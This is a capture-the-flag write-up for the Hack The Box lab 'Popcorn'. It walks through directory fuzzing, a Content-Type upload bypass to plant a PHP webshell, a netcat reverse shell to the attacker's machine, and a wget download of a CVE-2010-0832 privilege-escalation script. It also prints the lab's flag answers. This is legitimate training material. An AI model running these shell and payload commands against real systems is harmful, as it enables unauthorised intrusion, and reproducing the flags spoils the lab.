# Tasks

[**1. How many TCP ports are listening on Popcorn?**](#task-1)

[**2. What is the relative path on the webserver to a file sharing service?**](#task-2)

[**3. What HTTP request header is being used to filter uploaded content?**](#task-3)

[**4. What user is the webserver running as?**](#task-4)

[**5. User Flag**](#user-flag)

[**6. What is the 2010 CVE ID for a privilege escalation vulnerability in Linux PAM having to do with the message of the day?**](#task-6)

[**7. Root Flag**](#root-flag)

# Tools Used

- nmap
- gobuster
- BurpSuite
- ExploitDB

# Skills Used

- Web fuzzing
- File Upload Vulnerability
- Exploiting misconfigurations via CVEs

# Solutions

## Task 1

Same old same old.

![image](https://github.com/user-attachments/assets/13005bfa-46d2-4b71-b491-edb0acf14991)

**Answer: 2**

## Task 2

First, let's put the _domain name_ inside of our _/etc/hosts_.

![image](https://github.com/user-attachments/assets/bf0e6fb9-3c87-48c8-9a23-036d237fbadf)

Just like that.

Anyways, let's see if we can manually enumerate this before automating it.

![image](https://github.com/user-attachments/assets/48c4f955-1647-43e8-8dfd-f88e4b3caf5a)

Guess not :/

Aight let's pull out _gobuster_.

**Command Used:**

```
gobuster dir -u http://popcorn.htb/ -w /usr/share/dirb/wordlists/common.txt -x php 
```

Again, you can use other wordlists, I just like to use _common.txt_ most of the time.

Anyways, here's what I found from the _gobuster_ scan:

![image](https://github.com/user-attachments/assets/f51ece80-b7b4-4fce-8f88-1afccf274db4)

After checking out some of the other endpoints, I found this:

![image](https://github.com/user-attachments/assets/6f1d03f5-fea0-492a-baa1-bb1df4b568e0)

**Answer: /torrent**

## Task 3

Alright so, since I found a login page, my first instinct was to try _SQLi_ lmao (just basic ones).

That didn't work, but I did see something interesting.

![image](https://github.com/user-attachments/assets/d515aff1-479a-4cb5-98c2-a292c5b6ac42)

There is indeed a privileged user, called _Admin_, might be useful later, we'll see. (**Edit:** It was not :( )

Anyways, since _SQLi_ doesn't work (I already tried it on _Admin_ as well), let's go register ourselves and see what we can mess around with.

![image](https://github.com/user-attachments/assets/bfc1a6db-e506-4ebd-ac5f-d8e035f840e6)

We can now access this page to finally find the answer.

Truth be told though, I tried using _cURL_ for like 30 minutes. I eventually just resigned to using _Burp_ lmao.

Now even more embarassingly actually is, you know how I tried to find the file type accepted by the upload page?

Yeah, I wasn't supposed to get the file type, I was supposed to get the _request header_ that specifies that :/

**Answer: Content-Type**

**P.S.** This was a certified overthinking/reading comprehension moment, when the answer was something real easy :/

## Task 4

Anyways, now that I know that, since I can upload files, let's see if we can get ourselves a shell here.

**Process:**

I'm adding this as a separate section cuz honestly this took me so long to do.

**1. Upload own torrent file**

Sadly, trying to download the already existing _torrent_ in the browse page and uploading that doesn't work, it just says "this torrent already exists".

![image](https://github.com/user-attachments/assets/7048fb0e-e8da-4ef2-9a15-612cf5bfde34)

Anyways, if you're wondering where I got that from, I just searched ```linux iso torrent download``` and grabbed that.

And don't worry, I ran it through _VirusTotal_, nothing was detected (hopefully no false negatives, I don't wanna get banned lmao).

![image](https://github.com/user-attachments/assets/31607338-f069-46fd-ad8f-2e6dc0f99910)

Ok now that worked, onto the next step.

**2. Edit the torrent**

![image](https://github.com/user-attachments/assets/73966045-eaac-45ac-b868-81362b0c8494)

Notice how I can update the screenshot, and the file types allowed are _image files_.

This is important, cuz that means we can probably upload a _shell_ here.

At first, I thought naming the file _shell.png.php_ and altering its _magic bytes_ would do the trick.

![image](https://github.com/user-attachments/assets/b06757f9-d9f8-40c2-9a96-22abc4f3be3e)

Unfortunately, that didn't work, still an invalid file, so I turn to intercepting the request using _Burp_ to change _Content-Type_ accordingly.

![image](https://github.com/user-attachments/assets/de3ec18d-e07d-4c6a-ba54-f6149426e35e)

This time, it uploaded successfully, though we still have to find the file, so...

**3. Find the uploaded file**

Luckily, I already performed a _gobuster_ scan on _/torrent_ beforehand to see what kind of directories I was working with:

![image](https://github.com/user-attachments/assets/3477c852-a332-4d87-9848-a8fc3b98c3d4)

We probably want _/upload_.

![image](https://github.com/user-attachments/assets/fe8deb4b-029f-4ac8-b789-5cbd5bfa87c8)

Now that I found that, let's run what we need, then get a better _shell_.

![image](https://github.com/user-attachments/assets/627022e2-fc7a-4112-8c56-6914da8a2ef1)

**Answer: www-data**

## User Flag

Before we get that, let's get ourselves a better _shell_ first, I deserve that much after all the effort I put in lmao.

**On the webshell:**

```
nc [IP Address] [Port] -e /bin/bash
```

**On our machine:**

```
nc -lvnp [Port]
```

![image](https://github.com/user-attachments/assets/efead4ae-39c4-44b5-bc2f-1015eb292f0b)

Now let's upgrade it, we already found python anyway:

![image](https://github.com/user-attachments/assets/c31b682c-f25b-4535-a26d-4436882a757a)

Much better.

Anyways here's the steps for clarification:

```
1. Spawn bash with python

python -c 'import pty.pty.spawn("/bin/bash")'

2. Export term to be more interactive (dunno how to put it into words lmao)

export XTERM=term

3. Background the session, use the following command, then put it back

stty -echo raw;fg
```

Now that that's out of the way, let's actually grab the user flag.

![image](https://github.com/user-attachments/assets/1036d872-0ee3-4f64-9e44-155abbde6faf)

**Answer: f23c9842b43eca6a423eb89130a6d500**

## Task 6

Welp, let's find that in _ExploitDB_.

![image](https://github.com/user-attachments/assets/2f2dd222-6583-4399-9aa1-07c73524273e)

This checks out.

**Answer: CVE-2010-0832**

## Root Flag

Welp, time to spend the next few minutes figuring out how this _CVE_ works.

**3 Hours Later**

I finally figured it out lmao.

First off, I used the _EDB 14339_ version instead of the other version that I found since that worked better.

![image](https://github.com/user-attachments/assets/91856de6-aff2-4bd5-a120-c8de26469135)

Then, after using ```wget http://[IP Address]:[Port]/14339.sh``` to get it onto the victim machine, I ran it and ran into some problems.

After 'researching' (used ChatGPT lmao) on how to fix the issue, I found that it had something to do with the _CVE_ using _Windows-style line endings_ instead of _Unix-style_. Not sure what that implies but I do understand enough to know that that's not gonna work, especially considering that the victim machine is _Unix-based_.

So, I used ```dos2unix``` to convert the _shell script_ I got from _ExploitDB_ into something that the victim machine can run.

![image](https://github.com/user-attachments/assets/0563b4cc-de68-4a7a-878d-b8f0ac4feb9e)

Of course, once it was on the machine, I'd still need to use ```chmod +x``` on the _shell script_ to run it.

**P.S.** Sometimes using _./[Executable File]_ doesn't work, in which case, try ```sh [Executable File]``` or ```bash [Executable File]```.

![image](https://github.com/user-attachments/assets/84fa698b-5682-4a0f-9ffe-accdb9953865)

Now that we FINALLY have root, let's go grab the flag:

![image](https://github.com/user-attachments/assets/b6edfec0-0536-4c66-b996-4814d2f65c48)

**Answer: d1d7f09786abd6579d658b550835120e**

Overall, hella fun lab. Spent whole day (breaks in-and-out ofc) pwning this lab. Would do again.
